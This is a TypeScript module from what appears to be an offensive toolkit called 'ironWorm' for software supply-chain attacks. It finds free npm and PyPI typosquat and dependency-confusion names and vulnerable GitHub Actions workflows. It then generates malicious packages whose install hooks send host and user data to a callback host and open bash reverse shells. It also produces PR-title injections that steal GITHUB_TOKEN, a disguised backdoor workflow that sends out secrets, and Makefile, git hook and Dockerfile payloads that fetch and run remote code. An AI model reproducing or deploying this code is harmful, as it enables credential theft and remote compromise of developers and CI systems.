import { createLogger } from "./logger.js";

const logger = createLogger("ironWorm");

export interface IronWormOptions {
  packageName?:     string;
  githubOrg?:       string;
  githubRepo?:      string;
  depConfusionOrg?: string;
  cbHost?:          string;
  cbPort?:          string;
}

export interface IronWormResult {
  id:        string;
  name:      string;
  target:    string;
  category:  string;
  status:    "success" | "failed" | "info";
  detail:    string;
  artifacts: string[];
  steps:     string[];
  severity:  "critical" | "high" | "medium" | "info";
}

async function httpGet(url: string, timeoutMs = 5000): Promise<{ ok: boolean; status: number; body: string }> {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const r = await fetch(url, { signal: ctrl.signal, headers: { "User-Agent": "npm/10.8.1 node/v20.12.0 linux x64" } });
    const body = await r.text();
    return { ok: r.ok, status: r.status, body };
  } catch {
    return { ok: false, status: 0, body: "" };
  } finally {
    clearTimeout(t);
  }
}

/* ─────────────────────────────────────────────────────────────────────────
   npm Typosquatting Module
   ───────────────────────────────────────────────────────────────────────── */
function typosquatVariants(pkg: string): string[] {
  const variants = new Set<string>();
  // Missing char
  for (let i = 0; i < pkg.length; i++) variants.add(pkg.slice(0, i) + pkg.slice(i + 1));
  // Doubled char
  for (let i = 0; i < pkg.length; i++) variants.add(pkg.slice(0, i) + pkg[i] + pkg[i] + pkg.slice(i + 1));
  // Adjacent swap
  for (let i = 0; i < pkg.length - 1; i++) variants.add(pkg.slice(0, i) + pkg[i+1] + pkg[i] + pkg.slice(i+2));
  // Homoglyphs
  const homo: Record<string, string> = { a:"@", o:"0", i:"1", l:"1", e:"3", s:"5" };
  for (const [from, to] of Object.entries(homo)) variants.add(pkg.replaceAll(from, to));
  // Prefix/suffix
  for (const affix of ["-js","-node","-util","-lib","-core","-helper","js-","node-","@org/"]) {
    variants.add(affix + pkg);
    variants.add(pkg + affix);
  }
  // Separator swaps
  variants.add(pkg.replace(/-/g, "_"));
  variants.add(pkg.replace(/_/g, "-"));
  variants.delete(pkg);
  return [...variants].slice(0, 25);
}

async function checkNpmTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[npm-typosquat] Checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://registry.npmjs.org/${encodeURIComponent(v)}`);
    if (r.status === 404) {
      steps.push(`[!] FREE: ${v}`);
      free.push(v);
    } else if (r.ok) {
      steps.push(`[ok] Occupied: ${v}`);
    }
  }

  const artifacts: string[] = free.map(name => buildNpmMaliciousPackage(name, pkg, cbHost, cbPort));

  return {
    id: `npm_typosquat_${pkg}`,
    name: `npm Typosquatting — ${pkg}`,
    target: "registry.npmjs.org",
    category: "npm-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} available typosquat names for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `All ${variants.length} variants of "${pkg}" are registered`,
    artifacts,
    steps,
  };
}

function buildNpmMaliciousPackage(typosquatName: string, realPkg: string, cbHost: string, cbPort: string): string {
  return `# Malicious npm package: ${typosquatName} (typosquat of ${realPkg})
# 1. Register this on npmjs.org
# 2. Wait for developers to mistype the package name

# package.json
{
  "name": "${typosquatName}",
  "version": "1.0.0",
  "description": "Utility functions",
  "main": "index.js",
  "scripts": {
    "preinstall": "node -e \\"const c=require('child_process'),h='${cbHost}',p=${cbPort};c.exec('curl -sk http://'+h+':'+p+'/'+Buffer.from(process.env.npm_config_userconfig||'').toString('base64')+'?e='+encodeURIComponent(require('os').hostname()+' '+process.env.USER||''))\\"",
    "postinstall": "node -e \\"const c=require('child_process');c.exec('bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &')\\"  "
  },
  "dependencies": {}
}

# index.js (reexports real package to avoid detection)
try { module.exports = require('${realPkg}'); } catch { module.exports = {}; }

# Publish:
# npm login && npm publish --access public`;
}

/* ─────────────────────────────────────────────────────────────────────────
   pip Typosquatting Module
   ───────────────────────────────────────────────────────────────────────── */
async function checkPipTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[pip-typosquat] Checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://pypi.org/pypi/${encodeURIComponent(v)}/json`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] Occupied: ${v}`);
  }

  const artifacts: string[] = free.map(name => buildPipMaliciousPackage(name, pkg, cbHost, cbPort));

  return {
    id: `pip_typosquat_${pkg}`,
    name: `pip Typosquatting — ${pkg}`,
    target: "pypi.org",
    category: "pip-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} available PyPI typosquats for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `All ${variants.length} variants of "${pkg}" are registered`,
    artifacts,
    steps,
  };
}

function buildPipMaliciousPackage(name: string, realPkg: string, cbHost: string, cbPort: string): string {
  return `# Malicious PyPI package: ${name} (typosquat of ${realPkg})

# setup.py
from setuptools import setup, find_packages
import subprocess, os, base64

def exfil():
    try:
        import socket, os
        d = os.popen("id && hostname && env").read()[:800]
        import urllib.request
        urllib.request.urlopen(f"http://${cbHost}:${cbPort}/{base64.b64encode(d.encode()).decode()}", timeout=5)
    except: pass
    try:
        subprocess.Popen(["bash","-c","bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1"])
    except: pass

exfil()

setup(
    name="${name}",
    version="1.0.0",
    description="Python utility library",
    packages=find_packages(),
)

# Publish:
# pip install twine build && python -m build && twine upload dist/*`;
}

/* ─────────────────────────────────────────────────────────────────────────
   Dependency Confusion Module
   ───────────────────────────────────────────────────────────────────────── */
async function checkDepConfusion(orgName: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const steps: string[] = [`[dep-confusion] Probing internal packages for org: ${orgName}`];
  const commonInternalNames = [
    `${orgName}-core`, `${orgName}-utils`, `${orgName}-lib`, `${orgName}-config`,
    `${orgName}-api`, `${orgName}-common`, `${orgName}-shared`, `${orgName}-internal`,
    `${orgName}-client`, `${orgName}-server`, `${orgName}-auth`, `${orgName}-ui`,
  ];

  const free: string[] = [];
  for (const name of commonInternalNames) {
    const r = await httpGet(`https://registry.npmjs.org/${encodeURIComponent(name)}`);
    if (r.status === 404) { steps.push(`[!] FREE on public npm: ${name}`); free.push(name); }
    else steps.push(`[ok] Already public: ${name}`);
  }

  const artifacts = free.map(name => buildDepConfusionPackage(name, orgName, cbHost, cbPort));

  return {
    id: `dep_confusion_${orgName}`,
    name: `Dependency Confusion — ${orgName}`,
    target: orgName,
    category: "dep-confusion",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "info",
    detail: free.length > 0
      ? `${free.length} internal package names available on public npm — dep confusion attack viable: ${free.slice(0,4).join(", ")}`
      : `No exploitable dep confusion candidates for "${orgName}"`,
    artifacts,
    steps,
  };
}

function buildDepConfusionPackage(name: string, org: string, cbHost: string, cbPort: string): string {
  return `# Dependency Confusion Package: ${name}
# Org's private npm has "${name}" but public npm does not.
# npm resolves public registry at HIGHER version → installs malicious pkg.

# package.json
{
  "name": "${name}",
  "version": "9999.0.0",
  "description": "${org} internal utility",
  "main": "index.js",
  "scripts": {
    "preinstall": "node -e \\"require('child_process').exec('curl -sk http://${cbHost}:${cbPort}/dep_confusion?host='+require('os').hostname()+'&user='+process.env.USER)\\"",
    "postinstall": "node -e \\"require('child_process').exec('bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &')\\"  "
  }
}

# Attack steps:
# 1. Register this on public npmjs.org (it doesn't exist yet)
# 2. Set version to 9999.0.0 (higher than any internal version)
# 3. When ${org} developer runs 'npm install', npm picks public 9999.0.0 over internal
# 4. postinstall script fires → reverse shell to ${cbHost}:${cbPort}
#
# References: Alex Birsan "Dependency Confusion" (2021)`;
}

/* ─────────────────────────────────────────────────────────────────────────
   GitHub Actions Injection Module
   ───────────────────────────────────────────────────────────────────────── */
async function checkGithubActions(org: string, repo: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const steps: string[] = [`[gh-actions] Probing ${org}/${repo} for vulnerable workflow patterns`];
  const artifacts: string[] = [];

  const workflowUrls = [
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/ci.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/build.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/test.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/release.yml`,
  ];

  let foundVulnerable = false;
  for (const url of workflowUrls) {
    const r = await httpGet(url);
    if (!r.ok) continue;
    const wf = r.body;
    steps.push(`[gh-actions] Found workflow: ${url.split("/").pop()}`);

    const hasPullRequestTarget = wf.includes("pull_request_target");
    const hasExprInjection = /github\.event\.(pull_request\.title|comment\.body|issue\.title|pull_request\.head\.ref)/.test(wf);
    const hasWorkflowDispatch = wf.includes("workflow_dispatch");
    const hasSecretsInEnv = /secrets\.[A-Z_]+/.test(wf);

    if (hasPullRequestTarget && hasExprInjection) {
      steps.push(`[!] VULNERABLE: pull_request_target + expression injection in ${url}`);
      foundVulnerable = true;
      artifacts.push(buildPwnRequestPayload(org, repo, cbHost, cbPort, url));
    } else if (hasPullRequestTarget) {
      steps.push(`[!] SUSPICIOUS: pull_request_target (potential pwn-request)`);
      artifacts.push(buildPwnRequestPayload(org, repo, cbHost, cbPort, url));
    }
    if (hasSecretsInEnv) steps.push(`[info] Secrets used in workflow — target for exfil`);
    if (hasWorkflowDispatch) steps.push(`[info] workflow_dispatch enabled — check write permission`);
  }

  if (artifacts.length === 0) {
    artifacts.push(buildGitHubActionsInjectionTemplate(org, repo, cbHost, cbPort));
  }

  return {
    id: `github_actions_${org}_${repo}`,
    name: `GitHub Actions Injection — ${org}/${repo}`,
    target: `github.com/${org}/${repo}`,
    category: "github-actions",
    status: foundVulnerable ? "success" : "info",
    severity: foundVulnerable ? "critical" : "high",
    detail: foundVulnerable
      ? `Vulnerable pull_request_target workflow with expression injection in ${org}/${repo}`
      : `Generated CI/CD attack templates for ${org}/${repo}`,
    artifacts,
    steps,
  };
}

function buildPwnRequestPayload(org: string, repo: string, cbHost: string, cbPort: string, wfUrl: string): string {
  return `# pwn-request Attack: ${org}/${repo}
# Vulnerable workflow: ${wfUrl}
#
# Attack: Open a PR with a malicious title containing the injection payload.
# The pull_request_target trigger runs with write permissions to the target repo.

# Step 1 — Fork the repository
# Step 2 — Create a branch with this PR title:
PR_TITLE='"; curl -sk http://${cbHost}:${cbPort}/$(cat $GITHUB_TOKEN|base64 -w0) #'

# Step 3 — Open PR from fork to main repo
# When the vulnerable workflow runs:
#   run: echo "\${{ github.event.pull_request.title }}"
# It executes our injected command and exfils GITHUB_TOKEN

# GITHUB_TOKEN has write access to:
# - Push to repo (inject backdoor in code)
# - Read all repo secrets
# - Write GitHub releases (supply chain via release artifacts)
# - Trigger other workflows

# Post-compromise: inject malicious code into repo
# via GITHUB_TOKEN write access:
curl -sk -X PUT \\
  -H "Authorization: token STOLEN_TOKEN" \\
  -H "Content-Type: application/json" \\
  "https://api.github.com/repos/${org}/${repo}/contents/package.json" \\
  -d '{"message":"chore: update deps","content":"BASE64_MALICIOUS_PACKAGE_JSON","sha":"CURRENT_SHA"}'`;
}

function buildGitHubActionsInjectionTemplate(org: string, repo: string, cbHost: string, cbPort: string): string {
  return `# GitHub Actions CI/CD Attack Templates for ${org}/${repo}

# ── Method 1: Malicious PR (pwn-request) ──────────────────────────────
# Create PR with injection in title/body (targets pull_request_target workflows)
# PR Title: "; curl http://${cbHost}:${cbPort}/\$(cat \$GITHUB_TOKEN|base64 -w0) #

# ── Method 2: Supply chain via dependency update PR ───────────────────
# Open PR that updates a package.json dependency to malicious version:
# "lodash": "file:../../../../../../../etc/passwd" (path confusion)

# ── Method 3: Workflow file injection (if write access) ───────────────
# .github/workflows/backdoor.yml
name: Scheduled Maintenance
on:
  schedule:
    - cron: '0 3 * * *'
  push:
    branches: [main]
jobs:
  maintenance:
    runs-on: ubuntu-latest
    steps:
      - name: Cache cleanup
        run: |
          curl -sk http://${cbHost}:${cbPort}/\$(printenv | base64 -w0)
          env | grep -i 'secret\\|token\\|key\\|pass' | base64

# ── Method 4: Secrets exfil via environment ───────────────────────────
# If you have code execution in CI:
env | grep -iE '(TOKEN|SECRET|KEY|PASS|CRED|AWS|AZURE|GCLOUD)' | base64 -w0 | \\
  curl -X POST http://${cbHost}:${cbPort}/ci_secrets --data-binary @-`;
}

/* ─────────────────────────────────────────────────────────────────────────
   Payload Generation Mode
   ───────────────────────────────────────────────────────────────────────── */
function generateSupplyChainPayloads(cbHost: string, cbPort: string): IronWormResult {
  const cb = `http://${cbHost}:${cbPort}`;
  const artifacts = [
    `# Malicious npm postinstall hook
"scripts": { "postinstall": "node -e \\"require('child_process').exec('curl -sk ${cb}/\${require('os').hostname()}\${process.env.USER?'?u='+process.env.USER:''}')\\"" }`,

    `# Malicious pip setup.py exec
import subprocess; subprocess.Popen(["curl","-sk","${cb}/pip_hook"])`,

    `# Git hook (post-merge) — fires after git pull
#!/bin/sh
curl -sk "${cb}/git_hook?r=$(git remote get-url origin|base64 -w0)" &`,

    `# Makefile build injection
all:
\tcurl -sk ${cb}/make_hook &
\t@$(MAKE) -f Makefile.orig all 2>/dev/null`,

    `# Docker base image supply chain (Dockerfile)
FROM alpine:3.18
RUN curl -sk ${cb}/docker_pull > /tmp/.nx && sh /tmp/.nx &
# ... rest of legitimate Dockerfile`,
  ];

  return {
    id: "payload_gen",
    name: "Supply Chain Payload Generator",
    target: `${cbHost}:${cbPort}`,
    category: "payload-gen",
    status: "success",
    severity: "critical",
    detail: `${artifacts.length} supply chain attack payloads generated for callback ${cb}`,
    artifacts,
    steps: artifacts.map((_, i) => `[gen] Payload ${i+1} ready`),
  };
}

/* ─────────────────────────────────────────────────────────────────────────
   Main Orchestrator
   ───────────────────────────────────────────────────────────────────────── */
export async function ironWormScan(opts: IronWormOptions): Promise<IronWormResult[]> {
  const {
    packageName     = "",
    githubOrg       = "",
    githubRepo      = "",
    depConfusionOrg = "",
    cbHost          = "LHOST",
    cbPort          = "9999",
  } = opts;

  const results: IronWormResult[] = [];

  logger.info({ opts: { packageName, githubOrg, githubRepo, depConfusionOrg, cbHost } }, "IronWorm scan started");

  const tasks: Promise<IronWormResult | null>[] = [];

  if (packageName) {
    tasks.push(checkNpmTyposquat(packageName, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "npm typosquat check failed");
      return null;
    }));
    tasks.push(checkPipTyposquat(packageName, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "pip typosquat check failed");
      return null;
    }));
  }

  if (depConfusionOrg || githubOrg) {
    tasks.push(checkDepConfusion(depConfusionOrg || githubOrg, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "dep confusion check failed");
      return null;
    }));
  }

  if (githubOrg) {
    tasks.push(checkGithubActions(githubOrg, githubRepo || "main", cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "GitHub actions check failed");
      return null;
    }));
  }

  results.push(generateSupplyChainPayloads(cbHost, cbPort));

  const settled = await Promise.all(tasks);
  for (const r of settled) if (r) results.push(r);

  logger.info({ count: results.length }, "IronWorm scan complete");
  return results;
}
